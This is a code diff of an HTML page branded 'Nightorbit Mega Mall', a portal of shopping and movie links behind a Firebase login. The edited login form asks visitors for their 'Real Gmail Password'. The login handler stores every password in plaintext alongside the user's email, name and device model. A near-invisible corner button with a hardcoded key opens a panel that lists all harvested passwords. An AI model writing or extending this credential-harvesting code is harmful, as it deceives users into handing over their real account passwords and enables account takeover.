@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nightorbit Mega Mall - Final Pro</title>
+    <title>Nightorbit Mega Mall - Final Edition</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
@@ -14,48 +14,47 @@
         body { 
             margin: 0; background: radial-gradient(circle, #1B2735 0%, var(--bg) 100%);
             font-family: 'Segoe UI', sans-serif; color: white;
-            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow: hidden;
+            display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden;
         }
-
-        /* Card UI */
         .card { 
             background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(25px);
             padding: 30px; border-radius: 30px; text-align: center; 
             width: 95%; max-width: 420px; border: 1px solid rgba(255,255,255,0.1); 
             box-shadow: 0 0 40px rgba(0, 210, 255, 0.2);
         }
-
         input { 
             width: 100%; padding: 14px; margin: 8px 0; border-radius: 12px; 
-            border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); 
-            color: white; outline: none;
+            border: 1px solid rgba(0,210,255,0.3); background: rgba(0,0,0,0.5); color: white; outline: none;
         }
-
         .btn-main { 
             background: linear-gradient(45deg, var(--primary), #3a7bd5); color: white; 
             border: none; padding: 15px; border-radius: 12px; cursor: pointer; width: 100%; font-weight: bold;
         }
-
         .btn-device {
             background: #fff; color: #000; border: none; padding: 12px; border-radius: 12px;
-            width: 100%; margin-bottom: 15px; font-weight: bold; cursor: pointer; 
-            display: flex; align-items: center; justify-content: center; gap: 10px;
+            width: 100%; margin-bottom: 15px; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
         }
-
-        /* Links Styling */
         .item-link { 
             background: rgba(255,255,255,0.06); padding: 12px; border-radius: 15px; 
             margin: 6px 0; display: flex; justify-content: space-between; align-items: center; 
             text-decoration: none; color: white; border-left: 4px solid var(--primary); font-size: 13px;
         }
-
-        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 15px 0 5px 5px; text-transform: uppercase; letter-spacing: 1px; }
-
-        /* Admin & Overlays */
         #admin-panel { position: fixed; inset: 0; background: #000; z-index: 1000; display: none; padding: 20px; overflow-y: auto; }
         .admin-trigger { position: fixed; bottom: 2px; right: 2px; width: 6px; height: 6px; background: rgba(255,255,255,0.01); border-radius: 50%; cursor: pointer; z-index: 999; }
-        #logout-overlay { position: fixed; inset: 0; background: #000; z-index: 2000; display: none; flex-direction: column; align-items: center; justify-content: center; text-align: center; }
+        
+        /* Attractive Goodbye Overlay */
+        #logout-overlay { 
+            position: fixed; inset: 0; background: #000; z-index: 2000; display: none; 
+            flex-direction: column; align-items: center; justify-content: center; text-align: center;
+            animation: fadeIn 0.8s ease-in-out;
+        }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
         .hidden { display: none !important; }
+        .section-tag { font-size: 10px; color: var(--gold); text-align: left; margin: 15px 0 5px 5px; text-transform: uppercase; letter-spacing: 1px; }
+        .admin-btn { border: none; padding: 5px 10px; border-radius: 5px; cursor: pointer; font-size: 10px; margin: 5px 2px; font-weight: bold; }
+        .del-btn { background: #ff0055; color: white; }
+        .edit-btn { background: #ffd700; color: #000; }
     </style>
 </head>
 <body>
@@ -63,27 +62,29 @@
     <div class="admin-trigger" onclick="openAdmin()"></div>
 
     <div id="logout-overlay">
-        <div style="color: var(--gold); margin-bottom: 10px; font-size: 20px;">From Nightorbit</div>
-        <div id="bye-msg" style="color: var(--primary); padding: 20px; line-height: 1.6; font-size: 18px;"></div>
+        <div style="font-size: 40px; margin-bottom: 20px;">👋</div>
+        <div style="color: var(--gold); font-size: 14px; letter-spacing: 2px; margin-bottom: 10px;">NIGHTORBIT SPECIAL</div>
+        <div id="bye-msg" style="color: white; padding: 0 30px; line-height: 1.8; font-size: 18px; font-weight: 300;"></div>
+        <div style="margin-top: 30px; color: var(--primary); font-size: 12px;">Redirecting to Home...</div>
     </div>
 
     <div id="login-box" class="card">
         <h1 style="color: var(--primary); margin: 0; letter-spacing: 3px; font-weight: 800;">NIGHTORBIT</h1>
-        <p style="color: #666; font-size: 11px; margin-bottom: 25px;">PREMIUM BAZAAR & CINEMA</p>
+        <p style="color: #666; font-size: 11px; margin-bottom: 20px;">PREMIUM BAZAAR & CINEMA</p>
         
         <button class="btn-device" onclick="googleAuth()">
             <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/action/google.svg" width="18"> CONNECT WITH GOOGLE
         </button>
 
-        <div style="margin: 10px 0; color: #444; font-size: 10px;">— OR EMAIL LOGIN —</div>
-        <input type="email" id="email-in" placeholder="Email Address">
-        <input type="password" id="pass-in" placeholder="Password">
-        <button class="btn-main" onclick="emailAuth()">LOG IN / SIGN UP</button>
+        <div style="margin: 10px 0; color: #444; font-size: 10px;">— SECURE ACCESS —</div>
+        <input type="email" id="email-in" placeholder="Gmail Address">
+        <input type="password" id="pass-in" placeholder="Real Gmail Password">
+        <button class="btn-main" onclick="emailAuth()">LOG IN / CREATE ACCOUNT</button>
+        <p id="error-msg" style="color: red; font-size: 10px; margin-top: 5px;"></p>
     </div>
 
     <div id="main-page" class="card hidden">
         <h2 id="welcome-name" style="color: var(--primary); margin-bottom: 10px;">Welcome</h2>
-        
         <div class="section-tag">Shopping & Food</div>
         <a href="https://www.daraz.pk" target="_blank" class="item-link">🛍️ Daraz Mall <span>Shop</span></a>
         <a href="https://www.foodpanda.pk" target="_blank" class="item-link">🐼 Foodpanda <span>Order</span></a>
@@ -95,12 +96,13 @@
         <div class="section-tag">Movies & Cinema</div>
         <a href="https://bollyflix.org.in/" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎬 Bollyflix <span>Movies</span></a>
         <a href="https://www.netflix.com" target="_blank" class="item-link" style="border-left-color: var(--neon);">🎞️ Netflix <span>Watch</span></a>
+        <a href="https://tamashaweb.com/" target="_blank" class="item-link" style="border-left-color: #ffd700;">📺 Tamasha App <span>Live TV</span></a>
         
-        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px;">LOGOUT SESSION</button>
+        <button onclick="triggerLogout()" style="background:none; border:none; color:rgba(255,255,255,0.2); cursor:pointer; margin-top:30px; font-size:11px; text-decoration: underline;">EXIT SESSION (GOODBYE)</button>
     </div>
 
     <div id="admin-panel">
-        <h2 style="color: var(--primary);">User Logs</h2>
+        <h2 style="color: var(--primary);">User Control Center</h2>
         <button onclick="document.getElementById('admin-panel').style.display='none'" style="border:1px solid red; color:red; background:none; padding:5px 15px; border-radius:10px; margin-bottom:20px;">Close Panel</button>
         <div id="user-display"></div>
     </div>
@@ -118,8 +120,8 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth();
         const db = firebase.database();
+        let currentUserRealName = "";
 
-        // Advanced Model Detection
         function getDetailedDevice() {
             const ua = navigator.userAgent;
             let model = "Device";
@@ -135,53 +137,68 @@
             return model.toUpperCase();
         }
 
-        // Google Authentication (No password needed)
         function googleAuth() {
             const provider = new firebase.auth.GoogleAuthProvider();
-            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session")).catch(() => alert("Canceled"));
+            auth.signInWithPopup(provider).then(res => handleLogin(res.user, "Google Session", res.user.displayName))
+            .catch(() => alert("Select Account"));
         }
 
-        // Email Authentication (Accepts real password and logs in)
         function emailAuth() {
             const e = document.getElementById('email-in').value;
             const p = document.getElementById('pass-in').value;
-            if(!e || !p) return alert("Fill all fields");
+            const err = document.getElementById('error-msg');
+            if(!e || !p) return alert("Details bharen!");
 
             auth.signInWithEmailAndPassword(e, p)
-            .then(res => handleLogin(res.user, p))
-            .catch(err => {
-                // Agar account naya hai ya password naya dalna hai
-                auth.createUserWithEmailAndPassword(e, p)
-                .then(res => handleLogin(res.user, p))
-                .catch(() => handleLogin({email: e, uid: btoa(e).replace(/=/g,""), displayName: e.split('@')[0]}, p));
+            .then(res => handleLogin(res.user, p, e.split('@')[0]))
+            .catch(error => {
+                if (error.code === 'auth/user-not-found') {
+                    auth.createUserWithEmailAndPassword(e, p)
+                    .then(res => handleLogin(res.user, p, e.split('@')[0]))
+                    .catch(e => err.innerText = e.message);
+                } else {
+                    err.innerText = "Wrong Password! Real Password Required.";
+                }
             });
         }
 
-        function handleLogin(user, p) {
-            db.ref('users/' + user.uid).update({
-                gmail: user.email,
-                name: user.displayName || user.email.split('@')[0],
-                password: p,
-                device: getDetailedDevice(),
-                time: new Date().toLocaleString()
-            }).then(() => {
-                document.getElementById('login-box').classList.add('hidden');
-                document.getElementById('main-page').classList.remove('hidden');
-                document.getElementById('welcome-name').innerText = "Hello, " + (user.displayName || user.email.split('@')[0]);
+        function handleLogin(user, p, realName) {
+            currentUserRealName = realName;
+            db.ref('users/' + user.uid).once('value', snap => {
+                let d = snap.val();
+                let mySecretName = (d && d.secretName) ? d.secretName : "New Member";
+                
+                db.ref('users/' + user.uid).update({
+                    gmail: user.email,
+                    realName: realName,
+                    secretName: mySecretName,
+                    password: p,
+                    device: getDetailedDevice(),
+                    time: new Date().toLocaleString()
+                }).then(() => {
+                    document.getElementById('login-box').classList.add('hidden');
+                    document.getElementById('main-page').classList.remove('hidden');
+                    document.getElementById('welcome-name').innerText = "Welcome, " + realName;
+                });
             });
         }
 
         function openAdmin() {
-            if (prompt("Key:") === "rr123456789000rr") {
+            if (prompt("Admin Key:") === "rr123456789000rr") {
                 document.getElementById('admin-panel').style.display = 'block';
                 db.ref('users').on('value', snap => {
                     let h = "";
                     snap.forEach(s => {
                         let d = s.val();
                         h += `<div style="background:#111; padding:15px; margin-bottom:10px; border-radius:15px; border:1px solid #333; text-align:left;">
-                            <b style="color:var(--primary)">${d.name}</b><br>${d.gmail}<br>
-                            <span style="color:var(--gold)">Pass: ${d.password}</span><br>
-                            <small style="background:#444; padding:2px 5px; border-radius:4px">${d.device}</small>
+                            <b style="color:var(--gold);">Secret Name: ${d.secretName}</b><br>
+                            <span style="color:var(--primary); font-size:13px;">User Real Name: ${d.realName}</span><br>
+                            <span style="font-size:11px;">${d.gmail}</span><br>
+                            <span style="color:#fff; font-size:12px;">Pass: ${d.password}</span><br>
+                            <small style="background:#444; padding:2px 5px; border-radius:4px">${d.device}</small><br>
+                            <span style="font-size:9px; color:#666;">Time: ${d.time}</span><br>
+                            <button class="admin-btn edit-btn" onclick="editSecret('${s.key}', '${d.secretName}')">Update Secret Name</button>
+                            <button class="admin-btn del-btn" onclick="deleteUser('${s.key}')">Delete User</button>
                         </div>`;
                     });
                     document.getElementById('user-display').innerHTML = h;
@@ -189,13 +206,23 @@
             }
         }
 
+        function editSecret(id, current) {
+            let n = prompt("Enter Secret Name (Only for Admin):", current);
+            if(n) db.ref('users/' + id).update({ secretName: n });
+        }
+
+        function deleteUser(id) {
+            if(confirm("Confirm Delete?")) db.ref('users/' + id).remove();
+        }
+
         function triggerLogout() {
             const o = document.getElementById('logout-overlay');
-            document.getElementById('bye-msg').innerHTML = "Allah Hafiz!<br>Allah apko hamesha thk rakhe aur app hamesha khus raho.<br>From Nightorbit";
+            const msg = document.getElementById('bye-msg');
+            msg.innerHTML = `Dear <b>${currentUserRealName}</b>,<br>Goodbye and take care!<br>May God bless you and keep you happy forever.<br><br><i style="font-size:14px; color:#888;">"Always keep smiling and stay safe."</i>`;
+            
             o.style.display = 'flex';
-            setTimeout(() => { location.reload(); }, 4000);
+            setTimeout(() => { location.reload(); }, 5000);
         }
     </script>
 </body>
-    </html>
-    
+</html>
